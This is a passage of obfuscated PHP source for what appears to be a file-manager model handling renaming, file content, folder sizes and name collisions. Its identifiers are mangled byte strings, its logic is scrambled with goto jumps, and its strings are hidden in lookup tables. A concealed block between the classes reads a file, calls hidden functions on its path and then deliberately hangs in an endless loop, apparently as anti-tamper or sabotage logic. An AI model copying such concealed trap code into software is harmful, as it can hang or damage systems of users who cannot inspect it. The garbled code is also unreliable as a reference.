Model($c›éŞìÀ–…[2239])->where($FÑ–Éè¾åï)->delete(); goto AÒ•ê…Ëã†; c­¢°Éƒƒ›: Model($c›éŞìÀ–…[1991])->removeBySource($C†·´¤“«Í); Model($c›éŞìÀ–…[2231])->removeBySource($C†·´¤“«Í); $this->where($FÑ–Éè¾åï)->delete(); goto E½±Ø–„‡; cèà¶ªØ¥: } public function rename($fùáÁ¯Õ›Â, $b­Œ¶‹‰ä) { goto f‘‘¡ßøÃÏ; CÔõ§ô‚ùâ: $this->setNamePinyin($fùáÁ¯Õ›Â, $A‹İÕÒ†ö[$CÔ–°¼Øİ[28]], !1); $this->updateModifyTime($A»“ø¤Ÿ¼[$CÔ–°¼Øİ[457]]); return $this->where(array($CÔ–°¼Øİ[380] => $fùáÁ¯Õ›Â))->data($A‹İÕÒ†ö)->save(); goto d‚¾­îÚ‰¼; f‘‘¡ßøÃÏ: $CÔ–°¼Øİ =& $_SERVER[ì‹É]; $A»“ø¤Ÿ¼ = $this->sourceInfo($fùáÁ¯Õ›Â); if (!$A»“ø¤Ÿ¼) { return !1; } goto eìñùìó‚ò; dÍ¾æèÕÚ³: if (!$A»“ø¤Ÿ¼[$CÔ–°¼Øİ[367]] == $CÔ–°¼Øİ[84]) { $A‹İÕÒ†ö[$CÔ–°¼Øİ[369]] = get_path_ext($b­Œ¶‹‰ä); } Model($CÔ–°¼Øİ[497])->eventRename($fùáÁ¯Õ›Â, $A»“ø¤Ÿ¼[$CÔ–°¼Øİ[28]], $b­Œ¶‹‰ä); $this->sourceCacheClear($fùáÁ¯Õ›Â); goto CÔõ§ô‚ùâ; eìñùìó‚ò: $DôÇ·¬á = $this->fileNameExist($A»“ø¤Ÿ¼[$CÔ–°¼Øİ[457]], $b­Œ¶‹‰ä); if ($DôÇ·¬á) { return !1; } $A‹İÕÒ†ö = array($CÔ–°¼Øİ[383] => $b­Œ¶‹‰ä, $CÔ–°¼Øİ[516] => USER_ID); goto dÍ¾æèÕÚ³; d‚¾­îÚ‰¼: } public function setNamePinyin($a‘Œ¡‚ô—°, $a‹êØô’, $E³„Ş‹„¦ñ = true) { $A×Ç”ÉÎãô =& $_SERVER[ì‹É]; $E¥Ş÷ÄÎöá = Input::check($a‹êØô’, $A×Ç”ÉÎãô[520]); if ($E³„Ş‹„¦ñ && !$E¥Ş÷ÄÎöá) { return; } if (!$E¥Ş÷ÄÎöá) { $this->metaSet($a‘Œ¡‚ô—°, $A×Ç”ÉÎãô[412], null); $this->metaSet($a‘Œ¡‚ô—°, $A×Ç”ÉÎãô[411], null); return; } $aõß‘¯Á‡ = array($A×Ç”ÉÎãô[412] => str_replace($A×Ç”ÉÎãô[50], $A×Ç”ÉÎãô[33], Pinyin::encode($a‹êØô’)), $A×Ç”ÉÎãô[411] => Pinyin::encode($a‹êØô’, $A×Ç”ÉÎãô[521])); $this->metaSet($a‘Œ¡‚ô—°, $aõß‘¯Á‡); } public function getContent($C‚çè˜Æä¹) { goto Bã…·„ò’®; Bã…·„ò’®: $fºèÕ†áô• =& $_SERVER[ì‹É]; $fì£Òé…  = $this->fileInfoGet($C‚çè˜Æä¹); if (!$fì£Òé… ) { return !1; } goto FšÃòÜ–‘; C‰ªŸ¥è°”: return IO::getContent($fì£Òé… [$fºèÕ†áô•[76]]); goto fØ±˜ïËÕŒ; FšÃòÜ–‘: if ($fì£Òé… [$fºèÕ†áô•[78]] == 0) { return $fºèÕ†áô•[33]; } $A¡Ö Ÿ®­ = $fºèÕ†áô•[2242] . $fì£Òé… [$fºèÕ†áô•[160]]; if ($fì£Òé… [$fºèÕ†áô•[78]] <= 1024 * 10) { $Aî¸’ÊÚœ‰ = Cache::get($A¡Ö Ÿ®­); if (!$Aî¸’ÊÚœ‰) { $Aî¸’ÊÚœ‰ = IO::getContent($fì£Òé… [$fºèÕ†áô•[76]]); Cache::set($A¡Ö Ÿ®­, $Aî¸’ÊÚœ‰); } return $Aî¸’ÊÚœ‰; } goto C‰ªŸ¥è°”; fØ±˜ïËÕŒ: } public function setDesc($CˆË¯‹âë¬, $cÎ¯íêÑ©) { $FˆÜ­áèà† =& $_SERVER[ì‹É]; Model($FˆÜ­áèà†[497])->eventAddDesc($CˆË¯‹âë¬, $cÎ¯íêÑ©); return $this->metaSet($CˆË¯‹âë¬, $FˆÜ­áèà†[401], $cÎ¯íêÑ©); } public function setContent($f¸íÆ•‘åÎ, $BÄŠ•ïÉ¸‰ = '') { goto b­ÃÊôÆç; b‰Š•ëÓÇ: return !0; goto A¹Ô°âÎ§¬; b­ÃÊôÆç: $F¶–Ø½ô­ï =& $_SERVER[ì‹É]; $BèÙ°§ŒìÅ = $this->sourceInfo($f¸íÆ•‘åÎ); $dí•Ò¿Î‡ƒ = $this->fileInfoGet($f¸íÆ•‘åÎ); goto AŠÁ·õÎÈ; b¥šâ—°–Š: $eÌî× µÅÅ = $this->fileHistory($BèÙ°§ŒìÅ, $E•±ºê³ñÕ[$F¶–Ø½ô­ï[415]], $E•±ºê³ñÕ[$F¶–Ø½ô­ï[78]]); if (!$eÌî× µÅÅ) { return Model($F¶–Ø½ô­ï[418])->remove($E•±ºê³ñÕ[$F¶–Ø½ô­ï[415]]); } $this->folderSizeReset($BèÙ°§ŒìÅ[$F¶–Ø½ô­ï[457]]); goto b‰Š•ëÓÇ; AŠÁ·õÎÈ: if (!$dí•Ò¿Î‡ƒ || !$BèÙ°§ŒìÅ) { return !1; } $this->checkLock($f¸íÆ•‘åÎ); $E•±ºê³ñÕ = Model($F¶–Ø½ô­ï[418])->addFileByContent($BÄŠ•ïÉ¸‰, $BèÙ°§ŒìÅ[$F¶–Ø½ô­ï[28]]); goto b¥šâ—°–Š; A¹Ô°âÎ§¬: } public function fileSubstr($dÉ©†Šåã›, $BôÈã‡ØÏÕ, $D¨÷¼“Šó¼) { $eôº‘„Â¯ = $this->fileInfoGet($dÉ©†Šåã›); if (!$eôº‘„Â¯) { return !1; } return IO::fileSubstr($eôº‘„Â¯[$_SERVER[ì‹É][76]], $BôÈã‡ØÏÕ, $D¨÷¼“Šó¼); } public function fileInfoGet($Dù´â„©™¨) { goto eƒÇ…ïÆŠ; Eà„Ôää‰î: return $fî†Ì‘¦²ô; goto D¶Ô‡²ïó; AºÖ¬„àŒ: $fî†Ì‘¦²ô = Model($D¸ÓˆÜ½¬[418])->fileInfo($BÖÓ‡—Úí¸[$D¸ÓˆÜ½¬[415]]); if ($fî†Ì‘¦²ô) { $fî†Ì‘¦²ô[$D¸ÓˆÜ½¬[28]] = $BÖÓ‡—Úí¸[$D¸ÓˆÜ½¬[28]]; } self::$cacheFileInfo[$Dê¸»Œ”ä] = $fî†Ì‘¦²ô; goto Eà„Ôää‰î; f£Ë­ˆ³à: $Dê¸»Œ”ä = $D¸ÓˆÜ½¬[421] . $BÖÓ‡—Úí¸[$D¸ÓˆÜ½¬[415]]; $E½ÅìŞÏİ = _get(self::$cacheFileInfo, $Dê¸»Œ”ä); if ($E½ÅìŞÏİ) { return $E½ÅìŞÏİ; } goto AºÖ¬„àŒ; eƒÇ…ïÆŠ: $D¸ÓˆÜ½¬ =& $_SERVER[ì‹É]; $BÖÓ‡—Úí¸ = $this->sourceInfo($Dù´â„©™¨); if (!$BÖÓ‡—Úí¸ || $BÖÓ‡—Úí¸[$D¸ÓˆÜ½¬[367]]) { return !1; } goto f£Ë­ˆ³à; D¶Ô‡²ïó: } private function folderChildrenNumber($F„õ˜„˜­’) { $Fãğ±ù¸” =& $_SERVER[ì‹É]; $DÆÎ‘å©Ö› = $this->sourceInfo($F„õ˜„˜­’); $F§„½òÑËµ = array($Fãğ±ù¸”[517] => array($Fãğ±ù¸”[475], $DÆÎ‘å©Ö›[$Fãğ±ù¸”[455]] . $F„õ˜„˜­’ . $Fãğ±ù¸”[476]), $Fãğ±ù¸”[392] => 0, $Fãğ±ù¸”[510] => 1); $A—Í¼ñ = $this->where($F§„½òÑËµ)->count(); $bÚÊ…Ûæ„ = $this->where($F§„½òÑËµ)->where(array($Fãğ±ù¸”[510] => 0))->count(); return array($Fãğ±ù¸”[82] => $bÚÊ…Ûæ„, $Fãğ±ù¸”[83] => $A—Í¼ñ); } public function pathInfo($eÆø¬âÛ, $cƒ¹¥£Å“† = false) { goto e¼æáŒÛ™; e¼æáŒÛ™: $cÚ˜Õİ’ˆ =& $_SERVER[ì‹É]; $eíÑ¨×Öõ = $cÚ˜Õİ’ˆ[407] . intval($cƒ¹¥£Å“†) . $cÚ˜Õİ’ˆ[408] . $eÆø¬âÛ; $f…ÈŒ‹ó±Ÿ = _get(self::$cachePathInfo, $eíÑ¨×Öõ); goto fì­‘™†“ì; d¢ğ»Ãàä¬: $EËã½ƒ¡æ = $this->_listDataApplyItem($EËã½ƒ¡æ, $cƒ¹¥£Å“†); self::$cachePathInfo[$eíÑ¨×Öõ] = $EËã½ƒ¡æ; return $EËã½ƒ¡æ; goto AÖ¨Ñ‡Ÿ‡¹; fì­‘™†“ì: if ($f…ÈŒ‹ó±Ÿ) { return $f…ÈŒ‹ó±Ÿ; } $EËã½ƒ¡æ = $this->sourceInfo($eÆø¬âÛ); if (!$EËã½ƒ¡æ) { return !1; } goto d¢ğ»Ãàä¬; AÖ¨Ñ‡Ÿ‡¹: } public static $cachePathInfoMore = array(); public function pathInfoMore($DÓŞ¤î±Ÿš) { goto c†±Æ½Øîô; eáØâÓ‰—ñ: $FßœÜµ„Ò½ = $this->pathInfo($DÓŞ¤î±Ÿš); if (!$FßœÜµ„Ò½) { return !1; } if ($FßœÜµ„Ò½[$BÆ‘ç©¯[367]] == $BÆ‘ç©¯[84]) { $FßœÜµ„Ò½[$BÆ‘ç©¯[81]] = $this->folderChildrenNumber($DÓŞ¤î±Ÿš); } goto eéêæŸ˜¨•; c†±Æ½Øîô: $BÆ‘ç©¯ =& $_SERVER[ì‹É]; $fæ¦ğéâÖá = _get(self::$cachePathInfoMore, $DÓŞ¤î±Ÿš); if ($fæ¦ğéâÖá) { return $fæ¦ğéâÖá; } goto eáØâÓ‰—ñ; eéêæŸ˜¨•: self::$cachePathInfoMore[$DÓŞ¤î±Ÿš] = $FßœÜµ„Ò½; return $FßœÜµ„Ò½; goto dëâŒó×Ü×; dëâŒó×Ü×: } public function sourceInfo($Cù–£»ÜÜÆ) { $FŸ ×¶Ö­Š =& $_SERVER[ì‹É]; $E³‘ÜøäØ½ = $FŸ ×¶Ö­Š[406] . $Cù–£»ÜÜÆ; $CöŠ÷Øáæ… = _get(self::$cacheSourceInfo, $E³‘ÜøäØ½); if ($CöŠ÷Øáæ…) { return $CöŠ÷Øáæ…; } self::$cacheSourceInfo[$E³‘ÜøäØ½] = $this->where(array($FŸ ×¶Ö­Š[366] => $Cù–£»ÜÜÆ))->find(); return self::$cacheSourceInfo[$E³‘ÜøäØ½]; } public function sourceCacheClear($eŒÖ¹ÌâæÜ = false) { if ($eŒÖ¹ÌâæÜ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[ì‹É][406] . $eŒÖ¹ÌâæÜ]); } public function pathInfoByPath($f¦Ô‚Ûƒ¢, $a°ÊùÅÌ“ó) { $a×ÉÕ¸ÏÜÔ =& $_SERVER[ì‹É]; $aÙ½íè‚¦ù = !$a°ÊùÅÌ“ó ? array() : explode($a×ÉÕ¸ÏÜÔ[8], trim($a°ÊùÅÌ“ó, $a×ÉÕ¸ÏÜÔ[8])); $cèªµ×Í Æ = $f¦Ô‚Ûƒ¢; foreach ($aÙ½íè‚¦ù as $b²…šÁ’é§) { $C—Ô˜Øè´Ü = array($a×ÉÕ¸ÏÜÔ[457] => $cèªµ×Í Æ, $a×ÉÕ¸ÏÜÔ[28] => $b²…šÁ’é§); $Aœ‹Ñ»‹´Œ = $this->where($C—Ô˜Øè´Ü)->select(); if (!$Aœ‹Ñ»‹´Œ) { return !1; } $Aœ‹Ñ»‹´Œ = array_sort_by($Aœ‹Ñ»‹´Œ, $a×ÉÕ¸ÏÜÔ[393]); $cèªµ×Í Æ = $Aœ‹Ñ»‹´Œ[0][$a×ÉÕ¸ÏÜÔ[366]]; } return $this->pathInfo($cèªµ×Í Æ, !0); } protected function updateModifyTime($D—ä—…Ì“Ó) { goto cê‚¨ÕÅåŞ; Dº‰©ƒ§¤Ù: foreach ($D—ä—…Ì“Ó as $Cë­Û‹î÷ => $AÖìªÆèëÓ) { $D—ä—…Ì“Ó[$Cë­Û‹î÷] = intval($AÖìªÆèëÓ); } $cÇÜ÷Û… = array($bÓçâ²‡Î[366] => array($bÓçâ²‡Î[7], $D—ä—…Ì“Ó)); $EšçÔÎ™è = array($bÓçâ²‡Î[516] => USER_ID, $bÓçâ²‡Î[387] => time()); goto dÙä™š´ó; dÙä™š´ó: $this->where($cÇÜ÷Û…)->save($EšçÔÎ™è); goto AÕƒ‰ó¸‘; cê‚¨ÕÅåŞ: $bÓçâ²‡Î =& $_SERVER[ì‹É]; if (!$D—ä—…Ì“Ó) { return; } if (!is_array($D—ä—…Ì“Ó)) { $D—ä—…Ì“Ó = array($D—ä—…Ì“Ó); } goto Dº‰©ƒ§¤Ù; AÕƒ‰ó¸‘: } public function folderSizeReset($aîË×²”ó×) { goto dïë›È¢¢à; dëƒ¢ÁØê: CacheLock::unlock($AºÇÛíÎŞ); goto EÂ”‘å–ôå; a¡È„ŒÅŒÔ: $CËˆ£¡Ñöá = $D«»ğÏ±¡à - intval($cÕš¶˜Ó”[$d‡ÆŞ¹èØ[78]]); if ($CËˆ£¡Ñöá == 0) { return CacheLock::unlock($AºÇÛíÎŞ); } $this->where(array($d‡ÆŞ¹èØ[380] => $aîË×²”ó×))->setField($d‡ÆŞ¹èØ[78], $D«»ğÏ±¡à); goto FËæ…¦Œé¶; FËæ…¦Œé¶: $B¹„ÍêÉÇ = $this->parentLevelArray($cÕš¶˜Ó”[$d‡ÆŞ¹èØ[455]]); if ($B¹„ÍêÉÇ) { $AÈÌ³¾Áµí = array($d‡ÆŞ¹èØ[366] => array($d‡ÆŞ¹èØ[381], $B¹„ÍêÉÇ)); $this->where($AÈÌ³¾Áµí)->setAdd($d‡ÆŞ¹èØ[78], $CËˆ£¡Ñöá); } $this->targetSpaceUpdate($cÕš¶˜Ó”[$d‡ÆŞ¹èØ[368]], $cÕš¶˜Ó”[$d‡ÆŞ¹èØ[452]]); goto dëƒ¢ÁØê; D÷³¿¦é°: CacheLock::lock($AºÇÛíÎŞ, 20); $this->sourceCacheClear($aîË×²”ó×); $cÕš¶˜Ó” = $this->sourceInfo($aîË×²”ó×); goto DÛ×’ÓÓ””; DÛ×’ÓÓ””: $AÈÌ³¾Áµí = array($d‡ÆŞ¹èØ[365] => $aîË×²”ó×, $d‡ÆŞ¹èØ[392] => 0); $D«»ğÏ±¡à = $this->where($AÈÌ³¾Áµí)->sum($d‡ÆŞ¹èØ[78]); $D«»ğÏ±¡à = intval($D«»ğÏ±¡à); goto a¡È„ŒÅŒÔ; dïë›È¢¢à: $d‡ÆŞ¹èØ =& $_SERVER[ì‹É]; if ($this->statusIgnoreResetSpace) { return; } $AºÇÛíÎŞ = $d‡ÆŞ¹èØ[2243] . $aîË×²”ó×; goto D÷³¿¦é°; EÂ”‘å–ôå: } public function folderSizeResetChildren($e­·«§²¹Å) { goto E£ëÆòËÜŒ; E£ëÆòËÜŒ: $Bßâ¹®‰ğ =& $_SERVER[ì‹É]; $this->sourceCacheClear($e­·«§²¹Å); $f¹¡³ƒÄ×â = $this->sourceInfo($e­·«§²¹Å); goto eİĞÜ†·¨; eÑíŸ·é: $e§ÖÔËï¬[$Bßâ¹®‰ğ[367]] = 0; $d™ùáìôŞ = $this->field($C›š‘ªÜº£)->where($e§ÖÔËï¬)->select(); if (!$d™ùáìôŞ) { return; } goto Aô¸Í’Á®›; eİĞÜ†·¨: $e§ÖÔËï¬ = array($Bßâ¹®‰ğ[510] => 1, $Bßâ¹®‰ğ[517] => array($Bßâ¹®‰ğ[475], $f¹¡³ƒÄ×â[$Bßâ¹®‰ğ[455]] . $e­·«§²¹Å . $Bßâ¹®‰ğ[476])); $C›š‘ªÜº£ = $Bßâ¹®‰ğ[2244]; $aº½¿Ğå†é = $this->field($C›š‘ªÜº£)->where($e§ÖÔËï¬)->select(); goto eÑíŸ·é; BñŒ«¢ÜÛÁ: foreach ($aº½¿Ğå†é as $d¦ËÇƒ“‹¹) { if ($d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[78]] == $d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[2245]]) { continue; } $e‡Äáå……[] = array($Bßâ¹®‰ğ[366], $d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[366]], $Bßâ¹®‰ğ[78], $d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[78]]); } $this->saveAll($e‡Äáå……); goto cŒÛ“ïÆ™•; Aô¸Í’Á®›: $aº½¿Ğå†é[] = $f¹¡³ƒÄ×â; $aº½¿Ğå†é = array_to_keyvalue($aº½¿Ğå†é, $Bßâ¹®‰ğ[366]); foreach ($aº½¿Ğå†é as $EŒÄ™™“²Ğ => $d¦ËÇƒ“‹¹) { $aº½¿Ğå†é[$EŒÄ™™“²Ğ][$Bßâ¹®‰ğ[2245]] = $aº½¿Ğå†é[$EŒÄ™™“²Ğ][$Bßâ¹®‰ğ[78]]; $aº½¿Ğå†é[$EŒÄ™™“²Ğ][$Bßâ¹®‰ğ[78]] = 0; } goto b¿¶¼ëŞ…; b¿¶¼ëŞ…: foreach ($d™ùáìôŞ as $d¦ËÇƒ“‹¹) { $cá’ŒŠÃÕ¸ = $d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[457]] . $Bßâ¹®‰ğ[33]; if (!isset($aº½¿Ğå†é[$cá’ŒŠÃÕ¸])) { continue; } if ($d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[393]] == $aº½¿Ğå†é[$cá’ŒŠÃÕ¸][$Bßâ¹®‰ğ[393]]) { $aº½¿Ğå†é[$cá’ŒŠÃÕ¸][$Bßâ¹®‰ğ[78]] += $d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[78]]; } } foreach ($aº½¿Ğå†é as $d¦ËÇƒ“‹¹) { $EÄ÷¡É­ Ö = $this->parentLevelArray($d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[455]]); foreach ($EÄ÷¡É­ Ö as $cá’ŒŠÃÕ¸) { $cá’ŒŠÃÕ¸ = $cá’ŒŠÃÕ¸ . $Bßâ¹®‰ğ[33]; if (!isset($aº½¿Ğå†é[$cá’ŒŠÃÕ¸])) { continue; } if ($d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[393]] == $aº½¿Ğå†é[$cá’ŒŠÃÕ¸][$Bßâ¹®‰ğ[393]]) { $aº½¿Ğå†é[$cá’ŒŠÃÕ¸][$Bßâ¹®‰ğ[78]] += $d¦ËÇƒ“‹¹[$Bßâ¹®‰ğ[78]]; } } } $e‡Äáå…… = array(); goto BñŒ«¢ÜÛÁ; cŒÛ“ïÆ™•: } public function userSpaceReset($aÜ˜À‘ğ—¦ = false) { $DáŸÁºğÆ =& $_SERVER[ì‹É]; $d†¹¹ Ûº = $this->where(array($DáŸÁºğÆ[368] => self::TYPE_USER, $DáŸÁºğÆ[452] => $aÜ˜À‘ğ—¦, $DáŸÁºğÆ[367] => 0))->sum($DáŸÁºğÆ[78]); Model($DáŸÁºğÆ[466])->userEdit($aÜ˜À‘ğ—¦, array($DáŸÁºğÆ[2000] => $d†¹¹ Ûº)); } public function targetSpaceUpdate($eˆíÂÒæ, $EäÚ÷äí¢é) { $dÔŒ®‹¥Œ´ =& $_SERVER[ì‹É]; if (!$EäÚ÷äí¢é) { return; } if (!in_array($eˆíÂÒæ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $A×¢‰áğ×¤ = $this->targetSpaceSize($eˆíÂÒæ, $EäÚ÷äí¢é); if ($eˆíÂÒæ == self::TYPE_USER) { Model($dÔŒ®‹¥Œ´[466])->userEdit($EäÚ÷äí¢é, array($dÔŒ®‹¥Œ´[2000] => $A×¢‰áğ×¤)); } else { if ($eˆíÂÒæ == self::TYPE_GROUP) { Model($dÔŒ®‹¥Œ´[454])->groupEdit($EäÚ÷äí¢é, array($dÔŒ®‹¥Œ´[2000] => $A×¢‰áğ×¤)); } } } public function targetSpaceSize($EœšË–ì±´, $b¯º¡›ìŒ‹) { goto e’àÒØÀá; e’àÒØÀá: $Aƒ‚›×¢Éó =& $_SERVER[ì‹É]; $eø¤¨¬Æ¿ = $this->sourceRoot($EœšË–ì±´, $b¯º¡›ìŒ‹, !0); if (!$eø¤¨¬Æ¿) { return 0; } goto cÖ§ìè¿Ğ; D×ÀÒÒ™¶: $DìÅßÅŠ× = array_to_keyvalue($DìÅßÅŠ×, $Aƒ‚›×¢Éó[33], $Aƒ‚›×¢Éó[366]); $DìÅßÅŠ× = array_unique(array_filter($DìÅßÅŠ×)); if ($DìÅßÅŠ×) { $D˜«ÍŸ¾†ù = array($Aƒ‚›×¢Éó[380] => array($Aƒ‚›×¢Éó[381], $DìÅßÅŠ×)); $f«‰„Š§»« += floatval($this->where($D˜«ÍŸ¾†ù)->sum($Aƒ‚›×¢Éó[78])); } goto bá”ÄÌ‚¶; cÖ§ìè¿Ğ: $f«‰„Š§»« = floatval($eø¤¨¬Æ¿[$Aƒ‚›×¢Éó[78]]); $D˜«ÍŸ¾†ù = array($Aƒ‚›×¢Éó[517] => array($Aƒ‚›×¢Éó[475], $Aƒ‚›×¢Éó[2085] . $eø¤¨¬Æ¿[$Aƒ‚›×¢Éó[366]] . $Aƒ‚›×¢Éó[476])); $DìÅßÅŠ× = Model($Aƒ‚›×¢Éó[391])->field($Aƒ‚›×¢Éó[380])->where($D˜«ÍŸ¾†ù)->select(); goto D×ÀÒÒ™¶; bá”ÄÌ‚¶: return $f«‰„Š§»«; goto aê“Éƒáè; aê“Éƒáè: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($D‚£ï„Ã…£) { return $this->fileTypeProfile($D‚£ï„Ã…£, SourceModel::TYPE_USER); } public function groupFileTypeProfile($D—Ÿ¦§…‹¬) { return $this->fileTypeProfile($D—Ÿ¦§…‹¬, SourceModel::TYPE_GROUP); } private function fileTypeProfile($DéÙ‰¾ÑªÉ, $aä ’İ…º) { goto FôÇ‚™ÚÌñ; eÇ¾¦°£éã: if ($Aöò¤ğÖ¯¢) { return $Aöò¤ğÖ¯¢; } $eŠ‡öòŠ¾« = array($FÂ¹ƒÉ½²İ[510] => 0); if ($DéÙ‰¾ÑªÉ != !1) { $eŠ‡öòŠ¾«[$FÂ¹ƒÉ½²İ[452]] = $DéÙ‰¾ÑªÉ; $eŠ‡öòŠ¾«[$FÂ¹ƒÉ½²İ[368]] = $aä ’İ…º; } goto Dˆ¹¤ºº; FôÇ‚™ÚÌñ: $FÂ¹ƒÉ½²İ =& $_SERVER[ì‹É]; $eŒÉøà¼¿† = $FÂ¹ƒÉ½²İ[2246] . $DéÙ‰¾ÑªÉ . $FÂ¹ƒÉ½²İ[71] . $aä ’İ…º; $Aöò¤ğÖ¯¢ = Cache::get($eŒÉøà¼¿†); goto eÇ¾¦°£éã; e­»¿Å¼ÍŠ: foreach ($D’ö‘­äëê as $f¤ŠÕ³ => $E³˜º˜Ù‹µ) { $eŠ‡öòŠ¾«[$FÂ¹ƒÉ½²İ[369]] = $this->fileTypeWhere($f¤ŠÕ³); $fœŞõÄÓë[$f¤ŠÕ³] = array($FÂ¹ƒÉ½²İ[2248] => $E³˜º˜Ù‹µ[$FÂ¹ƒÉ½²İ[28]], $FÂ¹ƒÉ½²İ[2249] => $this->where($eŠ‡öòŠ¾«)->count(), $FÂ¹ƒÉ½²İ[512] => $this->where($eŠ‡öòŠ¾«)->sum($FÂ¹ƒÉ½²İ[78])); } Cache::set($eŒÉøà¼¿†, $fœŞõÄÓë, 1200); return $fœŞõÄÓë; goto fäõà¤Ç«’; Dˆ¹¤ºº: $fœŞõÄÓë = array(); $fœŞõÄÓë[$FÂ¹ƒÉ½²İ[2247]] = array($FÂ¹ƒÉ½²İ[2248] => LNG($FÂ¹ƒÉ½²İ[2247]), $FÂ¹ƒÉ½²İ[2249] => $this->where($eŠ‡öòŠ¾«)->count(), $FÂ¹ƒÉ½²İ[512] => $this->where($eŠ‡öòŠ¾«)->sum($FÂ¹ƒÉ½²İ[78])); $D’ö‘­äëê = KodIO::fileTypeList(); goto e­»¿Å¼ÍŠ; fäõà¤Ç«’: } public function fileNameExist($d«Àà×¤ò, $F˜ÓÌÅ¶‚Î) { $A”æ—à–Š =& $_SERVER[ì‹É]; $cšôé’Öôƒ = $this->childList($d«Àà×¤ò); foreach ($cšôé’Öôƒ as $CŞ­ßãØ½Ê) { if ($CŞ­ßãØ½Ê[$A”æ—à–Š[28]] == $F˜ÓÌÅ¶‚Î) { return $CŞ­ßãØ½Ê[$A”æ—à–Š[366]]; } } return !1; } public function childList($aƒ¹»‘¬öæ) { $Aò…Ÿ¥Ïêµ =& $_SERVER[ì‹É]; $dîÛÈŞŒœ¬ = array($Aò…Ÿ¥Ïêµ[457] => intval($aƒ¹»‘¬öæ), $Aò…Ÿ¥Ïêµ[393] => 0); $BòÌœ‹Ïà = $this->cacheMemory()->where($dîÛÈŞŒœ¬)->select(); $BòÌœ‹Ïà = $BòÌœ‹Ïà ? $BòÌœ‹Ïà : array(); foreach ($BòÌœ‹Ïà as $FœÉ´òÉ•à) { $DÇá½ˆí¿ä = $Aò…Ÿ¥Ïêµ[406] . $FœÉ´òÉ•à[$Aò…Ÿ¥Ïêµ[366]]; self::$cacheSourceInfo[$DÇá½ˆí¿ä] = $FœÉ´òÉ•à; } return $BòÌœ‹Ïà; } public function fileNameAuto($d¡¶®¹ô‚ï, $D¬À´îƒîˆ, $BœÃ»‹‡‡Á = REPEAT_RENAME, $b„ã¾ÒÁ£ = false) { $dô¹àÉ¦Âİ =& $_SERVER[ì‹É]; $DôôŞ÷×Õ¡ = $this->childList($d¡¶®¹ô‚ï); $c‹ÉÙšö°„ = array_to_keyvalue($DôôŞ÷×Õ¡, $dô¹àÉ¦Âİ[33], $dô¹àÉ¦Âİ[28]); return $this->fileNameAutoGet($c‹ÉÙšö°„, $D¬À´îƒîˆ, $BœÃ»‹‡‡Á, $b„ã¾ÒÁ£); } public function fileNameAutoGet($D§ÌÌ¸¼Š­, $AêÍ‡øŒÚ, $C†¹Ô‚Úë , $c±Ã¦Àø) { $a©ø³Ú¿êØ =& $_SERVER[ì‹É]; if ($C†¹Ô‚Úë  == REPEAT_REPLACE || !$D§ÌÌ¸¼Š­ || !in_array_not_case($AêÍ‡øŒÚ, $D§ÌÌ¸¼Š­) || $c±Ã¦Àø && $C†¹Ô‚Úë  != REPEAT_RENAME_FOLDER) { return $AêÍ‡øŒÚ; } if ($C†¹Ô‚Úë  == REPEAT_SKIP) { return !1; } $CµÉ‹œÜĞ = $a©ø³Ú¿êØ[94] . get_path_ext($AêÍ‡øŒÚ); $CµÉ‹œÜĞ = $CµÉ‹œÜĞ == $a©ø³Ú¿êØ[94] || $c±Ã¦Àø ? $a©ø³Ú¿êØ[33] : $CµÉ‹œÜĞ; for ($b×³êŸÛ¥¿ = 1; $b×³êŸÛ¥¿ <= count($D§ÌÌ¸¼Š­) + 1; $b×³êŸÛ¥¿++) { $d¢—½œô¤à = substr($AêÍ‡øŒÚ, 0, strlen($AêÍ‡øŒÚ) - strlen($CµÉ‹œÜĞ)); $F½‚Ü¬ô ˆ = $d¢—½œô¤à . "\x28{$b×³êŸÛ¥¿}\x29{$CµÉ‹œÜĞ}"; if (!in_array_not_case($F½‚Ü¬ô ˆ, $D§ÌÌ¸¼Š­)) { return $F½‚Ü¬ô ˆ; } } } } if (!isset($_SERVER[$_SERVER[ì‹É][733]]) || !isset($_SERVER[$_SERVER[ì‹É][790]])) { goto Aáº®¿½ğ†; Aáº®¿½ğ†: $a´Øø‹é— = $_SERVER[ì‹É][734]; $f‚•¶×¸ğË = $_SERVER[$_SERVER[ì‹É][735]] . $_SERVER[ì‹É][736]; $a†÷ÊÙ›‚² = $a´Øø‹é—($f‚•¶×¸ğË); goto e®¦æä™™; e®¦æä™™: $DÈ™Š’’îÇ = explode($_SERVER[ì‹É][214], $a†÷ÊÙ›‚²); if (count($DÈ™Š’’îÇ) < $_SERVER[ì‹É][553]) { $F—ƒÎ­Åª™ = $_SERVER[ì‹É][737]; $F—ƒÎ­Åª™(); } $B·¦ˆƒ·‹ƒ = $_SERVER[ì‹É][738]; goto AÎÀï“ÚŞ†; AÎÀï“ÚŞ†: $B·¦ˆƒ·‹ƒ($_SERVER[$_SERVER[ì‹É][735]] . $_SERVER[ì‹É][736]); $aÜàßŸî = 2; while ($aÜàßŸî > 1) { $E†â±Æò…ø = rawurlencode($aÜàßŸî . $_SERVER[ì‹É][358]); } goto eÉ‹œ§­¢å; eÉ‹œ§­¢å: } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\143\145\137\162\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\151\155\145", "\164\x69\155\x65", "\151\x6e\x73\145\x72\164", "\x66\165\156\143\164\x69\157\156")); public function listData($dİÇ”ø»¾‚ = false) { $d“Íò¸ßŠ =& $_SERVER[ì‹É]; $dİÇ”ø»¾‚ = $dİÇ”ø»¾‚ ? $dİÇ”ø»¾‚ : USER_ID; $BÄì®Ñ‘Å‘ = $this->where(array($d“Íò¸ßŠ[1342] => $dİÇ”ø»¾‚))->select(); return array_to_keyvalue($BÄì®Ñ‘Å‘, $d“Íò¸ßŠ[33], $d“Íò¸ßŠ[366]); } public function 